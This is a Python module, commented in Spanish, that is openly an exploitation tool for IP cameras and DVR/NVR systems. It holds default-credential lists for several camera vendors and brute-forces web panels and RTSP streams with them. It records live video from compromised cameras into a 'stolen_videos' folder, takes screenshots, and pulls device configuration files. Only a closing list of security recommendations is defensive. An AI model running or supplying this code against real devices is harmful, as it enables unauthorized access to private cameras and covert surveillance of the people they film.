#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Módulo 4: Camera/XVR Exploitation
Explota vulnerabilidades en cámaras IP y sistemas DVR/NVR
Incluye captura de video en vivo via RTSP
"""

import json
import os
import time
import socket
import requests
import threading
from datetime import datetime
from typing import Dict, List, Optional
from pathlib import Path
import cv2
import subprocess

class CameraExploit:
    """Clase para explotar cámaras IP y DVR/NVR"""
    
    # Credenciales por defecto de fabricantes comunes
    CAMERA_DEFAULT_CREDS = [
        # Hikvision
        ('admin', '12345'),
        ('admin', 'admin12345'),
        ('admin', 'hik12345'),
        
        # Dahua
        ('admin', 'admin'),
        ('admin', ''),
        ('admin', '888888'),
        ('666666', '666666'),
        
        # Uniview
        ('admin', '123456'),
        ('admin', ''),
        
        # EZVIZ
        ('admin', 'EZVIZ123'),
        ('admin', 'ezviz123'),
        
        # Genéricos DVR/NVR
        ('admin', 'admin'),
        ('admin', ''),
        ('admin', '1234'),
        ('admin', '12345'),
        ('admin', '123456'),
        ('admin', '1111'),
        ('admin', '0000'),
        ('admin', 'password'),
        ('root', 'root'),
        ('root', '12345'),
        ('root', 'admin'),
        ('888888', '888888'),
        ('666666', '666666'),
        ('user', 'user'),
        ('default', 'default'),
    ]
    
    # Rutas RTSP comunes
    RTSP_PATHS = [
        '/Streaming/Channels/101',  # Hikvision
        '/Streaming/Channels/1',
        '/cam/realmonitor?channel=1&subtype=0',  # Dahua
        '/cam/realmonitor?channel=1&subtype=1',
        '/h264/ch1/main/av_stream',  # Uniview
        '/live/ch00_0',
        '/live',
        '/stream1',
        '/stream2',
        '/video',
        '/mpeg4',
        '/h264',
        '/media/video1',
    ]
    
    def __init__(self, target_ip: str, output_dir: str = "reports"):
        """
        Inicializa el módulo de explotación de cámaras
        
        Args:
            target_ip: IP del DVR/NVR objetivo
            output_dir: Directorio para guardar informes
        """
        self.target_ip = target_ip
        self.output_dir = output_dir
        self.video_dir = "loot/stolen_videos"
        self.screenshot_dir = "loot/screenshots"
        
        # Crear directorios
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        Path(self.video_dir).mkdir(parents=True, exist_ok=True)
        Path(self.screenshot_dir).mkdir(parents=True, exist_ok=True)
        
        # Cargar configuración
        self.config = self._load_config()
        
        # Estructura del informe
        self.report = {
            "module": "Camera/XVR Exploitation",
            "target": target_ip,
            "timestamp": datetime.now().isoformat(),
            "start_time": datetime.now().isoformat(),
            "end_time": None,
            "duration_seconds": 0,
            "status": "IN_PROGRESS",
            "vulnerabilities_found": [],
            "access_obtained": False,
            "valid_credentials": None,
            "rtsp_access": False,
            "cameras_found": [],
            "actions_performed": [],
            "loot": {
                "videos_captured": [],
                "screenshots_taken": [],
                "config_files": [],
                "extracted_credentials": []
            },
            "recommendations": []
        }
    
    def _load_config(self) -> Dict:
        """Carga configuración desde config.env"""
        config = {
            'max_video_size_mb': 200,
            'max_video_duration_sec': 180,
            'attack_delay': 0.5
        }
        
        try:
            if os.path.exists('config.env'):
                with open('config.env', 'r') as f:
                    for line in f:
                        if '=' in line and not line.startswith('#'):
                            key, value = line.strip().split('=', 1)
                            if 'MAX_VIDEO_SIZE_MB' in key:
                                config['max_video_size_mb'] = int(value)
                            elif 'MAX_VIDEO_DURATION_SECONDS' in key:
                                config['max_video_duration_sec'] = int(value)
                            elif 'ATTACK_DELAY' in key:
                                config['attack_delay'] = float(value)
        except Exception as e:
            print(f"[!] Config no disponible, usando valores por defecto: {e}")
        
        return config
    
    def _save_report(self):
        """Guarda el informe en JSON"""
        try:
            output_file = os.path.join(self.output_dir, "informe_camera_exploitation.json")
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.report, f, indent=4, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error guardando informe: {e}")
    
    def run_exploitation(self) -> Dict:
        """
        Ejecuta el proceso completo de explotación de cámaras
        
        Returns:
            Diccionario con el informe completo
        """
        print(f"\n{'='*70}")
        print(f"  MÓDULO 4: CAMERA/XVR EXPLOITATION")
        print(f"{'='*70}")
        print(f"[*] Objetivo: {self.target_ip}")
        print(f"[*] Tipo: DVR/NVR/Camera System\n")
        
        start_time = time.time()
        
        try:
            # 1. Verificar si el host está activo
            if not self._check_host_alive():
                print(f"[!] El host {self.target_ip} no responde")
                self.report['status'] = 'FAILED'
                return self.report
            
            # 2. Escanear puertos
            print(f"[*] Escaneando puertos...")
            open_ports = self._scan_camera_ports()
            print(f"    [✓] Puertos abiertos: {', '.join(map(str, open_ports))}")
            
            # 3. Intentar explotación del panel web (puerto 80)
            if 80 in open_ports or 8000 in open_ports:
                print(f"\n[*] Intentando explotación vía panel web...")
                web_result = self._exploit_web_panel()
                
                if web_result['success']:
                    self.report['access_obtained'] = True
                    self.report['valid_credentials'] = web_result['credentials']
                    self.report['actions_performed'].append("Acceso obtenido vía panel web")
            
            # 4. Intentar acceso RTSP (puerto 554)
            if 554 in open_ports:
                print(f"\n[*] Intentando acceso RTSP...")
                rtsp_result = self._exploit_rtsp()
                
                if rtsp_result['success']:
                    self.report['rtsp_access'] = True
                    self.report['access_obtained'] = True
                    
                    if not self.report['valid_credentials']:
                        self.report['valid_credentials'] = rtsp_result['credentials']
                    
                    self.report['cameras_found'] = rtsp_result['streams']
                    self.report['actions_performed'].append(f"Acceso RTSP obtenido - {len(rtsp_result['streams'])} streams encontrados")
                    
                    # 5. Capturar video si se obtuvo acceso
                    print(f"\n[*] Capturando video de las cámaras...")
                    self._capture_videos(rtsp_result['streams'])
            
            # 6. Intentar descargar configuración
            if self.report['access_obtained']:
                print(f"\n[*] Intentando descargar configuración...")
                self._download_configuration()
            
            # Determinar estado final
            if self.report['access_obtained']:
                self.report['status'] = 'SUCCESS'
                print(f"\n[✓] EXPLOTACIÓN EXITOSA")
            elif len(self.report['vulnerabilities_found']) > 0:
                self.report['status'] = 'PARTIAL'
                print(f"\n[!] EXPLOTACIÓN PARCIAL")
            else:
                self.report['status'] = 'FAILED'
                print(f"\n[✗] EXPLOTACIÓN FALLIDA")
        
        except KeyboardInterrupt:
            print(f"\n[!] Explotación interrumpida por el usuario")
            self.report['status'] = 'INTERRUPTED'
        
        except Exception as e:
            print(f"\n[!] Error durante la explotación: {e}")
            self.report['status'] = 'ERROR'
            import traceback
            traceback.print_exc()
        
        finally:
            # Finalizar informe
            end_time = time.time()
            self.report['end_time'] = datetime.now().isoformat()
            self.report['duration_seconds'] = round(end_time - start_time, 2)
            
            # Agregar recomendaciones
            self._add_recommendations()
            
            # Guardar informe
            self._save_report()
            
            print(f"\n{'='*70}")
            print(f"  RESUMEN DE EXPLOTACIÓN")
            print(f"{'='*70}")
            print(f"Estado: {self.report['status']}")
            print(f"Acceso obtenido: {'SÍ' if self.report['access_obtained'] else 'NO'}")
            print(f"RTSP activo: {'SÍ' if self.report['rtsp_access'] else 'NO'}")
            print(f"Cámaras encontradas: {len(self.report['cameras_found'])}")
            print(f"Videos capturados: {len(self.report['loot']['videos_captured'])}")
            print(f"Duración: {self.report['duration_seconds']} segundos")
            print(f"Informe: {self.output_dir}/informe_camera_exploitation.json")
            print(f"{'='*70}\n")
        
        return self.report
    
    def _check_host_alive(self) -> bool:
        """Verifica si el host está vivo"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, 80))
            sock.close()
            return result == 0
        except:
            return False
    
    def _scan_camera_ports(self) -> List[int]:
        """Escanea puertos comunes de cámaras/DVR"""
        common_ports = [80, 554, 8000, 8080, 37777, 443]
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            except:
                pass
        
        return open_ports
    
    def _exploit_web_panel(self) -> Dict:
        """Intenta explotar el panel web del DVR/NVR"""
        result = {
            'success': False,
            'credentials': None
        }
        
        ports = [80, 8000, 8080]
        
        for port in ports:
            base_url = f"http://{self.target_ip}:{port}"
            
            try:
                response = requests.get(base_url, timeout=3)
                print(f"    [✓] Panel web encontrado en puerto {port}")
                
                # Intentar credenciales por defecto
                for username, password in self.CAMERA_DEFAULT_CREDS:
                    if self._try_web_login(base_url, username, password):
                        print(f"    [✓✓✓] ¡ACCESO WEB OBTENIDO! - {username}:{password}")
                        result['success'] = True
                        result['credentials'] = {'user': username, 'pass': password}
                        
                        self.report['vulnerabilities_found'].append({
                            "type": "Default/Weak Credentials - Web Panel",
                            "severity": "CRITICAL",
                            "details": f"Panel web acepta credenciales: {username}:{password}",
                            "credentials": result['credentials']
                        })
                        
                        return result
                    
                    time.sleep(self.config['attack_delay'])
            
            except:
                continue
        
        return result
    
    def _try_web_login(self, base_url: str, username: str, password: str) -> bool:
        """Intenta login en panel web"""
        try:
            # Método 1: Basic Auth
            response = requests.get(
                base_url,
                auth=(username, password),
                timeout=3
            )
            
            if response.status_code == 200:
                return True
            
            # Método 2: Form POST común en DVR/NVR
            login_endpoints = ['/Login', '/login', '/check_user.cgi', '/check_user.xml']
            
            for endpoint in login_endpoints:
                data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                }
                
                response = requests.post(
                    base_url + endpoint,
                    data=data,
                    timeout=3
                )
                
                if response.status_code == 200 and 'fail' not in response.text.lower():
                    return True
        
        except:
            pass
        
        return False
    
    def _exploit_rtsp(self) -> Dict:
        """Intenta acceso a streams RTSP"""
        result = {
            'success': False,
            'credentials': None,
            'streams': []
        }
        
        print(f"    [*] Probando acceso RTSP sin autenticación...")
        
        # Intentar sin credenciales primero
        for path in self.RTSP_PATHS:
            rtsp_url = f"rtsp://{self.target_ip}:554{path}"
            
            if self._test_rtsp_stream(rtsp_url):
                print(f"    [✓✓✓] Stream RTSP sin autenticación: {path}")
                result['success'] = True
                result['streams'].append({
                    'url': rtsp_url,
                    'path': path,
                    'requires_auth': False
                })
                
                self.report['vulnerabilities_found'].append({
                    "type": "Unauthenticated RTSP Access",
                    "severity": "CRITICAL",
                    "details": f"Stream RTSP accesible sin autenticación: {path}"
                })
        
        # Intentar con credenciales
        if not result['success']:
            print(f"    [*] Probando credenciales en RTSP...")
            
            for username, password in self.CAMERA_DEFAULT_CREDS:
                for path in self.RTSP_PATHS[:5]:  # Probar solo los más comunes
                    rtsp_url = f"rtsp://{username}:{password}@{self.target_ip}:554{path}"
                    
                    if self._test_rtsp_stream(rtsp_url, authenticated=True):
                        print(f"    [✓✓✓] Stream RTSP con credenciales: {username}:{password}")
                        result['success'] = True
                        result['credentials'] = {'user': username, 'pass': password}
                        result['streams'].append({
                            'url': rtsp_url,
                            'path': path,
                            'requires_auth': True,
                            'credentials': result['credentials']
                        })
                        
                        self.report['vulnerabilities_found'].append({
                            "type": "Weak RTSP Credentials",
                            "severity": "CRITICAL",
                            "details": f"RTSP acepta credenciales débiles: {username}:{password}",
                            "credentials": result['credentials']
                        })
                        
                        # Encontrar más streams con estas credenciales
                        for other_path in self.RTSP_PATHS:
                            if other_path != path:
                                other_url = f"rtsp://{username}:{password}@{self.target_ip}:554{other_path}"
                                if self._test_rtsp_stream(other_url, authenticated=True):
                                    result['streams'].append({
                                        'url': other_url,
                                        'path': other_path,
                                        'requires_auth': True,
                                        'credentials': result['credentials']
                                    })
                        
                        return result
                    
                    time.sleep(self.config['attack_delay'] / 2)
        
        return result
    
    def _test_rtsp_stream(self, rtsp_url: str, authenticated: bool = False) -> bool:
        """Prueba si un stream RTSP está accesible"""
        try:
            cap = cv2.VideoCapture(rtsp_url)
            
            # Intentar leer un frame
            ret, frame = cap.read()
            cap.release()
            
            return ret and frame is not None
        
        except:
            return False
    
    def _capture_videos(self, streams: List[Dict]):
        """Captura video de los streams RTSP"""
        max_duration = self.config['max_video_duration_sec']
        max_size_bytes = self.config['max_video_size_mb'] * 1024 * 1024
        
        for idx, stream in enumerate(streams[:5]):  # Máximo 5 cámaras
            print(f"    [*] Capturando video de cámara {idx + 1}/{min(len(streams), 5)}...")
            
            try:
                rtsp_url = stream['url']
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                video_file = os.path.join(self.video_dir, f"camera_{idx + 1}_{timestamp}.mp4")
                
                # Usar OpenCV para capturar
                cap = cv2.VideoCapture(rtsp_url)
                
                if not cap.isOpened():
                    print(f"    [!] No se pudo abrir el stream")
                    continue
                
                # Obtener propiedades del video
                fps = int(cap.get(cv2.CAP_PROP_FPS)) or 25
                width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                
                # Configurar writer
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(video_file, fourcc, fps, (width, height))
                
                start_time = time.time()
                frame_count = 0
                
                while True:
                    ret, frame = cap.read()
                    
                    if not ret:
                        break
                    
                    out.write(frame)
                    frame_count += 1
                    
                    # Verificar límites
                    elapsed = time.time() - start_time
                    file_size = os.path.getsize(video_file) if os.path.exists(video_file) else 0
                    
                    if elapsed >= max_duration:
                        print(f"    [✓] Límite de tiempo alcanzado ({max_duration}s)")
                        break
                    
                    if file_size >= max_size_bytes:
                        print(f"    [✓] Límite de tamaño alcanzado ({max_size_bytes} bytes)")
                        break
                    
                    # Mostrar progreso cada segundo
                    if frame_count % fps == 0:
                        print(f"        Grabando... {int(elapsed)}s / {max_duration}s", end='\r')
                
                cap.release()
                out.release()
                
                # Verificar si se capturó algo
                if os.path.exists(video_file) and os.path.getsize(video_file) > 1000:
                    file_size = os.path.getsize(video_file)
                    duration = time.time() - start_time
                    
                    print(f"\n    [✓✓✓] Video capturado: {video_file}")
                    print(f"        Duración: {duration:.1f}s | Tamaño: {file_size / (1024*1024):.2f} MB")
                    
                    self.report['loot']['videos_captured'].append({
                        'camera': f"Camera {idx + 1}",
                        'file': video_file,
                        'duration_seconds': round(duration, 2),
                        'size_bytes': file_size,
                        'size_mb': round(file_size / (1024*1024), 2),
                        'stream_url': stream['path'],
                        'captured_at': datetime.now().isoformat()
                    })
                    
                    self.report['actions_performed'].append(
                        f"Video capturado: Cámara {idx + 1} - {duration:.1f}s, {file_size / (1024*1024):.2f}MB"
                    )
                    
                    # Tomar screenshot
                    self._take_screenshot(video_file, idx + 1)
                else:
                    if os.path.exists(video_file):
                        os.remove(video_file)
                    print(f"\n    [!] No se pudo capturar video válido")
            
            except Exception as e:
                print(f"\n    [!] Error capturando video: {e}")
                import traceback
                traceback.print_exc()
    
    def _take_screenshot(self, video_file: str, camera_num: int):
        """Toma un screenshot del video capturado"""
        try:
            cap = cv2.VideoCapture(video_file)
            ret, frame = cap.read()
            
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                screenshot_file = os.path.join(self.screenshot_dir, f"camera_{camera_num}_{timestamp}.jpg")
                cv2.imwrite(screenshot_file, frame)
                
                self.report['loot']['screenshots_taken'].append({
                    'camera': f"Camera {camera_num}",
                    'file': screenshot_file,
                    'source_video': video_file
                })
                
                print(f"    [✓] Screenshot guardado: {screenshot_file}")
            
            cap.release()
        
        except Exception as e:
            print(f"    [!] Error tomando screenshot: {e}")
    
    def _download_configuration(self):
        """Intenta descargar configuración del DVR/NVR"""
        if not self.report['valid_credentials']:
            return
        
        creds = self.report['valid_credentials']
        
        # Endpoints comunes para descargar config
        config_endpoints = [
            '/cgi-bin/configManager.cgi?action=getConfig&name=All',  # Dahua
            '/ISAPI/System/configurationData',  # Hikvision
            '/cgi-bin/export_cfg.cgi',
            '/backup.cfg',
        ]
        
        for endpoint in config_endpoints:
            try:
                url = f"http://{self.target_ip}{endpoint}"
                response = requests.get(
                    url,
                    auth=(creds['user'], creds['pass']),
                    timeout=5
                )
                
                if response.status_code == 200 and len(response.content) > 100:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    config_file = os.path.join("loot/router_configs", f"dvr_config_{timestamp}.cfg")
                    
                    with open(config_file, 'wb') as f:
                        f.write(response.content)
                    
                    print(f"    [✓] Configuración descargada: {config_file}")
                    self.report['loot']['config_files'].append(config_file)
                    self.report['actions_performed'].append("Configuración del DVR descargada")
                    break
            
            except:
                continue
    
    def _add_recommendations(self):
        """Agrega recomendaciones de seguridad"""
        recommendations = [
            "Cambiar TODAS las contraseñas por defecto inmediatamente",
            "Deshabilitar acceso RTSP desde Internet (solo red local)",
            "Implementar contraseñas fuertes (mínimo 12 caracteres)",
            "Actualizar firmware del DVR/NVR a la última versión",
            "Configurar firewall para bloquear acceso externo a puertos de cámaras",
            "Implementar VPN para acceso remoto seguro",
            "Habilitar logging y alertas de intentos de acceso",
            "Segmentar red de cámaras en VLAN separada",
            "Verificar y limpiar configuraciones de acceso remoto (P2P/Cloud)",
            "Realizar auditorías de seguridad periódicas"
        ]
        
        self.report['recommendations'] = recommendations

